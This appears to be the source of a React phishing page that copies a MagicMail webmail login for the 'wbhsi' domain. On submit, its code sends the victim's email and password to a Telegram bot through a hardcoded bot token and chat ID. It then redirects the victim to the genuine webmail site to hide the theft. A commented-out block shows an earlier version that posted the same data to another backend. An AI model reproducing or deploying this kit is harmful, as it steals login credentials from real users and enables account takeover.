import React from 'react';


import'./home.css';
import logo from './logo.png';
import mascon from './mascon.png';

import { useState } from 'react';
import axios from 'axios';
import wbhsi from './wbhsi.png';

import { useEffect } from 'react';
function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Wbhsi")

    const[showError, setShowError] = useState(false);





async function handleSubmit(e){
    e.preventDefault();


    try {
        // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
        //     email:email,
        //     password:password,
        //     platform:platform
        // });

        const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
            chat_id: 5916570239,
            text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
          });


    
        // Handle success
     

        if(response.status == 200){
           // console.log(response.data.message);

          
           window.location.href = 'https://webmail.wbhsi.net/webmail/';
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    

    
}

    return (
        <>
            {/* <nav className='mynav px-3 py-3'>
                <img className='navimage' src={mascon} />

            </nav> */}

                <div className='py-5'>

                </div>

                <div className='text-center'>
            <img className='navimage' src={wbhsi} />

            </div>

                {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            <div className='formdiv col-md-4 m-auto p-0 '>
            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}


            

                <div className='cardhead text-center'>
                
Welcome to MagicMail Webmail
                </div>

                <form onSubmit={handleSubmit} >

                <div class="formrow text-center mt-3">
                                <span class="prompt"><label for="user">Email</label></span>
                                                <div class="element"><input type="email"onChange={function(e){
                                                    setUserName(e.target.value);
                                                }}value={email} className='inputwide' required/>
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Password</label></span>
                                                <div class="element"><input onChange={function(e){
                                                    setPassword(e.target.value);
                                                }} value={password} type="password"className='inputwide' required/>
                                </div>
                        </div>


                    <div className='buttondiv py-4 text-center'>
                        <button className='mybutton bg-light rounded'type="submit">Login</button>

                    </div>



                </form>



               
                

            </div>

            <br/>
                <br/>
                <div className='px-3 py-2 bg-light col-md-4 m-auto'>
                    <p className='text-center'>© Copyright 2009-2024 LinuxMagic Inc. All Rights Reserved <br/>
www.magicmail.com</p>

                </div>
            
            <br/>

                

        </>
    );

}

export default Home;